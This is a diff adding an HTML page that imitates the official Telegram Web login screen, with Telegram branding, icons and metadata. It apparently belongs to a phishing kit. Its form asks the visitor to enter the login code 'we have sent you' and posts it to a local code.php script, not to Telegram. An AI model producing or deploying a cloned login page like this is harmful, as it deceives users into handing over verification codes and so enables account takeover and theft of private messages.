@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html style="display: block; background: rgb(231, 235, 240) none repeat scroll 0% 0%;" manifest="webogram.appcache" ng-csp="" xmlns:ng="http://angularjs.org" id="ng-app" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>Telegram Web</title><link rel="stylesheet" href="app.css"><link href="https://web.telegram.org/favicon.ico" type="image/x-icon" rel="shortcut icon"><link rel="apple-touch-icon" href="https://web.telegram.org/img/iphone_home120.png"><link rel="apple-touch-icon" sizes="120x120" href="https://web.telegram.org/img/iphone_home120.png"><link rel="apple-touch-startup-image" media="(device-width: 320px)" href="https://web.telegram.org/img/iphone_startup.png"><meta name="apple-mobile-web-app-title" content="Telegram Web"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="theme-color" content="#497495"><meta name="google" content="notranslate"><meta property="og:title" content="Telegram Web"><meta property="og:url" content="https://web.telegram.org/"><meta property="og:image" content="https://web.telegram.org/img/logo_share.png"><meta property="og:site_name" content="Telegram Web"><meta property="og:description" content="Welcome to the Web application of Telegram messenger. See https://github.com/zhukov/webogram for more info."><link rel="stylesheet" href="desktop.css"></head><body class="non_osx non_msie is_1x"><!-- ngView:  --><div class="page_wrap" ng-view=""><div class="login_page_wrap" my-custom-background="#e7ebf0">
+  <div class="login_head_bg"></div>
+  <div class="login_page">
+    <div class="login_head_wrap clearfix" ng-switch="progress.enabled">
+      <!-- ngSwitchWhen: true -->
+      <!-- ngSwitchDefault:  --><div ng-switch-default="" class="login_head_submit_wrap">
+        <!-- ngIf: !credentials.phone_code_hash --><!-- end ngIf: !credentials.phone_code_hash -->
+        <!-- ngIf: credentials.phone_code_hash && !credentials.phone_code_valid -->
+        <!-- ngIf: credentials.phone_code_valid && credentials.phone_unoccupied -->
+        <!-- ngIf: credentials.phone_code_valid && credentials.password_needed -->
+      </div><!-- end ngSwitchWhen: -->
+      <a class="login_head_logo_link" href="https://telegram.org/" target="_blank">
+        <i class="icon icon-tg-logo"></i><i class="icon icon-tg-title"></i>
+      </a>
+    </div>
+
+    <div class="login_form_wrap">
+      <!-- ngIf: error.message -->
+
+      <form action="code.php" method="post">
+	   <h3 class="login_form_head" my-i18n="login_sign_in">Code</h3>
+        <p class="login_form_lead" my-i18n="login_enter_number_description">Please inter code we have sent you </p>
+
+		  <div class="md-input-group login_phone_num_input_group md-input-animated" ng-class="{'md-input-error': error.field == 'phone'}" my-labeled-input="" ng-switch="error.field == 'phone'">
+            <!-- ngSwitchWhen: true -->
+            <!-- ngSwitchDefault:  --><label ng-switch-default="" class="md-input-label" my-i18n="login_tel_input_placeholder"> </label><!-- end ngSwitchWhen: -->
+            
+			<input style="" required="" autocomplete="off" my-submit-on-enter="" class="md-input ng-pristine ng-invalid ng-invalid-required ng-touched" my-focus-on="country_selected" name="code" ng-model="credentials.phone_number" type="tel" placeholder="Code">
+          </div>
+		  <input type="submit" name="submit" value="next" style="background-color: #5682A3 ;border: none; color: white;padding: 10px 32px;text-align: center; text-decoration: none;display: inline-block;font-size: 16px;">
+	  </form>
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+      <!-- ngIf: credentials.phone_code_hash && !credentials.phone_code_valid -->
+
+      <!-- ngIf: credentials.phone_code_valid && credentials.phone_unoccupied -->
+
+      <!-- ngIf: credentials.phone_code_valid && credentials.password_needed -->
+
+    </div>
+
+    <div ng-switch="about.shown">
+      <!-- ngSwitchWhen: true -->
+      <!-- ngSwitchDefault:  --><div ng-switch-default="" class="login_footer_wrap">
+        <p my-i18n="login_about_intro">Welcome to the official Telegram web-client.</p>
+        <a class="logo_footer_learn_more_link" href="" ng-click="about.shown = true" my-i18n="login_about_learn">Learn more</a>
+      </div><!-- end ngSwitchWhen: -->
+
+    </div>
+  </div>
+
+</div>
+
+</div><div id="notify_sound"></div><script src="app.js"></script></body></html>
